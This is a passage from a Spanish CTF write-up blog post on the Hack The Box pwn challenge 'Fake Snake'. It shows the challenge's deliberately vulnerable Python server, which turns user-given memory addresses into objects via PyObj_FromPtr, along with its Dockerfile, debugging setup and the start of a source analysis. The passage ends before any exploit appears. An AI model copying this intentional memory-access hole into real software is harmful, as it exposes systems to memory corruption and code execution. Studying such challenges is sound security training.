<!doctype html><html lang="es"><head><title>Fake Snake | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Python _internals_. Primitiva _fake object_"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Python _internals_. Primitiva _fake object_"><meta itemprop="keywords" content><meta itemprop="name" content="Fake Snake"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Python _internals_. Primitiva _fake object_"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Fake Snake"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/pwn/fake-snake/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Python _internals_. Primitiva _fake object_"><meta name="twitter:description" content="Python _internals_. Primitiva _fake object_"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Fake Snake"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/htb-challenges/pwn/fake-snake/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/pwn/fake-snake/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/pwn/fake-snake/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/pwn/fake-snake/&amp;text=Fake%20Snake" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/htb-challenges/pwn/fake-snake/&amp;title=Fake%20Snake" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Fake Snake</h1><p class="mb4 f6 dib tracked">28 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#entorno-de-configuración">Entorno de configuración</a></li><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a><ul><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#función-de-información">Función de información</a></li></ul></li><li><a href="#aprendiendo-python-_internals_">Aprendiendo Python <em>internals</em></a><ul><li><a href="#objetos-de-python">Objetos de Python</a></li><li><a href="#_fake-objects_"><em>Fake objects</em></a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li><li><a href="#primitiva-_fake-object_">Primitiva <em>fake object</em></a></li><li><a href="#arreglando-el-_exploit_">Arreglando el <em>exploit</em></a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona este <em>script</em> de Python que se ejecuta en la instancia remota:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python</span>

<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">_ctypes</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> PyObj_FromPtr</span>

<span class="mtk1">storage</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {}</span>
<span class="mtk1">commands</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">f</span><span class="mtk4">'''</span>
<span class="mtk4">Zero: </span><span class="mtk6">{</span><span class="mtk8">id</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtk6">}</span>
<span class="mtk4">0) Add To Store</span>
<span class="mtk4">1) Remove From Store</span>
<span class="mtk4">2) Load Address</span>
<span class="mtk4">'''</span><span class="mtk1">.</span><span class="mtk8">strip</span><span class="mtk1">()</span>

<span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk6">True</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk1">commands</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">match</span><span class="mtk1">(</span><span class="mtk8">input</span><span class="mtk1">(</span><span class="mtk4">'Selection:'</span><span class="mtk1">)):</span>
<span class="mtk1">        </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk4">'0'</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">inp</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">input</span><span class="mtk1">(</span><span class="mtk4">'To Add:'</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk1">storage</span><span class="mtk1">[</span><span class="mtk8">id</span><span class="mtk1">(</span><span class="mtk1">inp</span><span class="mtk1">)] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">inp</span>
<span class="mtk1">            </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk8">id</span><span class="mtk1">(</span><span class="mtk1">inp</span><span class="mtk1">))</span>
<span class="mtk1">            </span><span class="mtk5">del</span><span class="mtk1"> </span><span class="mtk1">inp</span>
<span class="mtk1">        </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk4">'1'</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">input</span><span class="mtk1">(</span><span class="mtk4">'To Remove:'</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">addr</span><span class="mtk1">.</span><span class="mtk8">isdecimal</span><span class="mtk1">() </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">addr</span><span class="mtk1">) </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">storage</span><span class="mtk1">:</span>  
<span class="mtk1">                </span><span class="mtk5">del</span><span class="mtk1"> </span><span class="mtk1">storage</span><span class="mtk1">[</span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">addr</span><span class="mtk1">)]</span>
<span class="mtk1">        </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk4">'2'</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">input</span><span class="mtk1">(</span><span class="mtk4">'To Load:'</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">addr</span><span class="mtk1">.</span><span class="mtk8">isdecimal</span><span class="mtk1">():</span>
<span class="mtk1">                </span><span class="mtk8">print</span><span class="mtk1">(PyObj_FromPtr(</span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">addr</span><span class="mtk1">)))</span>
<span class="mtk1">            </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'Invalid Address'</span><span class="mtk1">)</span>
</code></pre></div><p>Además, tenemos un <code>Dockerfile</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">FROM</span><span class="mtk1"> python@sha256:7ded8135894464123583e8a000e6e88aa8a</span><span class="mtk1">114a634a3eebe8556d69f7e03ffc3</span>  
<span class="mtk5">RUN</span><span class="mtk1"> apt update &amp;&amp; \</span>
<span class="mtk1">    apt install -y socat &amp;&amp; \</span>
<span class="mtk1">    rm -rf /var/lib/apt/lists/*</span>
<span class="mtk5">COPY</span><span class="mtk1"> challenge/server.py /</span>
<span class="mtk5">COPY</span><span class="mtk1"> challenge/flag.txt /</span>
<span class="mtk5">USER</span><span class="mtk1"> 1000</span>
<span class="mtk5">CMD</span><span class="mtk1"> [</span><span class="mtk4">"socat"</span><span class="mtk1">, </span><span class="mtk4">"tcp-l:1337,reuseaddr,fork"</span><span class="mtk1">, </span><span class="mtk4">"EXEC:python3 -S ./server.py"</span><span class="mtk1">]</span>
</code></pre></div><p>Esta vez no hay archivo binario, por lo que debemos explotar el programa en Python utilizando algunas primitivas de Python <em>internals</em>.</p><h2 id="entorno-de-configuración">Entorno de configuración</h2><p>Si construimos la imagen de Docker y la ejecutamos en un contenedor, veremos que estamos tratando con Python 3.11.3:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">docker</span> build -t pwn_fake_snake <span class="mtku">.</span>
[+] Building 4.7s (9/9) FINISHED
<span class="code-dark-blue"> =&gt; [internal] load .dockerignore                                                                                                                        0.0s</span>  
<span class="code-dark-blue"> =&gt; =&gt; transferring context: 2B                                                                                                                          0.0s</span>
<span class="code-dark-blue"> =&gt; [internal] load build definition from Dockerfile                                                                                                     0.0s</span>
<span class="code-dark-blue"> =&gt; =&gt; transferring dockerfile: 344B                                                                                                                     0.0s</span>
<span class="code-dark-blue"> =&gt; [internal] load metadata for docker.io/library/python@sha256:7ded8135894464123583e8a000e6e88aa8a114a634a3eebe8556d69f7e03ffc3                        0.0s</span>
<span class="code-dark-blue"> =&gt; [1/4] FROM docker.io/library/python@sha256:7ded8135894464123583e8a000e6e88aa8a114a634a3eebe8556d69f7e03ffc3                                          1.9s</span>
<span class="code-dark-blue"> =&gt; =&gt; resolve docker.io/library/python@sha256:7ded8135894464123583e8a000e6e88aa8a114a634a3eebe8556d69f7e03ffc3                                          0.0s</span>
<span class="code-dark-blue"> =&gt; =&gt; sha256:7ded8135894464123583e8a000e6e88aa8a114a634a3eebe8556d69f7e03ffc3 1.37kB / 1.37kB                                                           0.0s</span>
<span class="code-dark-blue"> =&gt; =&gt; sha256:4c7870c9f1f753961c4e61166ecf70f851da452f8b5c098fceafe5a59f866daf 6.90kB / 6.90kB                                                           0.0s</span>
<span class="code-dark-blue"> =&gt; =&gt; sha256:9fbefa3370776b7ec7633cf07efc14cc24e0c0cd53893ad0e7e3f44ffdc1bedb 27.14MB / 27.14MB                                                         1.1s</span>
<span class="code-dark-blue"> =&gt; =&gt; sha256:a25702e0699eca20ab682bbfa60f6bb7775e4fb18ef65c038ffda342fdab9e3a 2.78MB / 2.78MB                                                           0.5s</span>
<span class="code-dark-blue"> =&gt; =&gt; sha256:970808dbe7d8b24a899ce97f54228fdc39129ac3098f4c519f34591f0a5bfb4c 11.98MB / 11.98MB                                                         0.8s</span>
<span class="code-dark-blue"> =&gt; =&gt; sha256:7ea720a5ba93c8f8ee2b7bab0d0de862fa1b8c3885409bbd9897a6ddbf3b507a 243B / 243B                                                               0.9s</span>
<span class="code-dark-blue"> =&gt; =&gt; sha256:7657e2f3a89a8d274a1e1f952b5112c88329d4ec172d66fcc25680409c802d35 3.37MB / 3.37MB                                                           1.7s</span>
<span class="code-dark-blue"> =&gt; =&gt; extracting sha256:9fbefa3370776b7ec7633cf07efc14cc24e0c0cd53893ad0e7e3f44ffdc1bedb                                                                0.4s</span>
<span class="code-dark-blue"> =&gt; =&gt; extracting sha256:a25702e0699eca20ab682bbfa60f6bb7775e4fb18ef65c038ffda342fdab9e3a                                                                0.1s</span>
<span class="code-dark-blue"> =&gt; =&gt; extracting sha256:970808dbe7d8b24a899ce97f54228fdc39129ac3098f4c519f34591f0a5bfb4c                                                                0.2s</span>
<span class="code-dark-blue"> =&gt; =&gt; extracting sha256:7ea720a5ba93c8f8ee2b7bab0d0de862fa1b8c3885409bbd9897a6ddbf3b507a                                                                0.0s</span>
<span class="code-dark-blue"> =&gt; =&gt; extracting sha256:7657e2f3a89a8d274a1e1f952b5112c88329d4ec172d66fcc25680409c802d35                                                                0.1s</span>
<span class="code-dark-blue"> =&gt; [internal] load build context                                                                                                                        0.0s</span>
<span class="code-dark-blue"> =&gt; =&gt; transferring context: 107B                                                                                                                        0.0s</span>
<span class="code-dark-blue"> =&gt; [2/4] RUN apt update &&     apt install -y socat &&     rm -rf /var/lib/apt/lists/*                                                                  2.6s</span>
<span class="code-dark-blue"> =&gt; [3/4] COPY challenge/server.py /                                                                                                                     0.0s</span>
<span class="code-dark-blue"> =&gt; [4/4] COPY challenge/flag.txt /                                                                                                                      0.0s</span>
<span class="code-dark-blue"> =&gt; exporting to image                                                                                                                                   0.0s</span>
<span class="code-dark-blue"> =&gt; =&gt; exporting layers                                                                                                                                  0.0s</span>
<span class="code-dark-blue"> =&gt; =&gt; writing image sha256:97cb8e5f57ae290a28118c93ce8c81871c2aa32f7ba21e5e6ab8ebe01b139f88                                                             0.0s</span>
<span class="code-dark-blue"> =&gt; =&gt; naming to docker.io/library/pwn_fake_snake                                                                                                        0.0s</span>

<span class="code-red">#</span> <span class="code-dark-green">docker</span> run --rm -it pwn_fake_snake bash
I have no name!@38883a7537ad:/$ python3 --version
Python 3.11.3
I have no name!@38883a7537ad:/$ exit
exit
</code></pre></div><p>Dado que trataremos con objetos de Python en memoria y otras cosas de Python <em>internals</em>, será útil construir Python 3.11 para tener símbolos en GDB (usé <code>make altinstall</code> para mantener mi versión Python predeterminada):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">cd</span> <span class="mtku">/opt</span>

<span class="code-red">#</span> <span class="code-dark-green">git</span> clone https://github.com/python/cpython.git
Cloning into 'cpython'...
remote: Enumerating objects: 946090, done.
remote: Counting objects: 100% (1385/1385), done.
remote: Compressing objects: 100% (794/794), done.
remote: Total 946090 (delta 860), reused 939 (delta 589), pack-reused 944705  
Receiving objects: 100% (946090/946090), 559.96 MiB | 29.98 MiB/s, done.
Resolving deltas: 100% (749546/749546), done.

<span class="code-red">#</span> <span class="code-dark-green">cd</span> <span class="mtku">cpython</span>

<span class="code-red">#</span> <span class="code-dark-green">git</span> switch 3.11
Branch '3.11' set up to track remote branch '3.11' from 'origin'.
Switched to a new branch '3.11'

<span class="code-red">#</span> <span class="code-dark-green">./configure</span>
...

<span class="code-red">#</span> <span class="code-dark-green">make</span>
...

<span class="code-red">#</span> <span class="code-dark-green">make</span> altinstall
...

<span class="code-red">#</span> <span class="code-dark-green">python3</span> --version
Python 3.8.10

<span class="code-red">#</span> <span class="code-dark-green">python3.11</span> --version
Python 3.11.3+
</code></pre></div><p>La <a target="_blank" href="https://devguide.python.org/advanced-tools/gdb/">Guía de Desarrolladores de Python</a> recomienda usar <code>python-gdb.py</code> tener algunas funcionalidades adicionales en GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'add-auto-load-safe-path /opt/cpython/python-gdb.py'</span> &gt;&gt; <span class="mtku">~/.gdbinit</span>  
</code></pre></div><p>Sin embargo, no los usé, solo GDB con <a target="_blank" href="https://github.com/hugsy/gef">gef</a>.</p><h2 id="análisis-del-código-fuente">Análisis del código fuente</h2><p>Lo primero que parece interesante en el <em>script</em> es el uso de <code>PyObj_FromPtr</code> de <code>_ctypes</code>. Esta función toma una dirección de memoria e intenta analizarlo como objeto Python. Por otro lado, el uso de <code>id</code> también es interesante. Esta función devuelve la dirección de un objeto Python dado.</p><p>Por ejemplo, tenemos <code>id(0)</code> en el menú:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">commands</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">f</span><span class="mtk4">'''</span>
<span class="mtk4">Zero: </span><span class="mtk6">{</span><span class="mtk8">id</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtk6">}</span>
<span class="mtk4">0) Add To Store</span>
<span class="mtk4">1) Remove From Store</span>  
<span class="mtk4">2) Load Address</span>
<span class="mtk4">'''</span><span class="mtk1">.</span><span class="mtk8">strip</span><span class="mtk1">()</span>
</code></pre></div><p>El programa crea un objeto <code>dict</code> llamado <code>storage</code>. Entonces, tenemos tres opciones:</p><h3 id="función-de-asignación">Función de asignación</h3><p>Podemos agregar un objeto <code>str</code> y el objeto <code>dict</code> mantendrá la dirección del <code>str</code> como clave y el valor <code>str</code> como valor:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk4">'0'</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">inp</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">input</span><span class="mtk1">(</span><span class="mtk4">'To Add:'</span><span class="mtk1">)</span>  
<span class="mtk1">            </span><span class="mtk1">storage</span><span class="mtk1">[</span><span class="mtk8">id</span><span class="mtk1">(</span><span class="mtk1">inp</span><span class="mtk1">)] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">inp</span>
<span class="mtk1">            </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk8">id</span><span class="mtk1">(</span><span class="mtk1">inp</span><span class="mtk1">))</span>
<span class="mtk1">            </span><span class="mtk5">del</span><span class="mtk1"> </span><span class="mtk1">inp</span>
</code></pre></div><h3 id="función-de-liberación">Función de liberación</h3><p>Con la opción <code>1</code> podemos indicar una clave (en realidad una dirección) para eliminarla del objeto <code>dict</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk4">'1'</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">input</span><span class="mtk1">(</span><span class="mtk4">'To Remove:'</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">addr</span><span class="mtk1">.</span><span class="mtk8">isdecimal</span><span class="mtk1">() </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">addr</span><span class="mtk1">) </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">storage</span><span class="mtk1">:</span>  
</code></pre></div><p>En realidad, no usé esta función en el <em>exploit</em>.</p><h3 id="función-de-información">Función de información</h3><p>Finalmente, tenemos la oportunidad de cargar cualquier objeto Python siempre que sepamos la dirección de memoria exacta donde se encuentra:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk4">'2'</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">input</span><span class="mtk1">(</span><span class="mtk4">'To Load:'</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">addr</span><span class="mtk1">.</span><span class="mtk8">isdecimal</span><span class="mtk1">():</span>
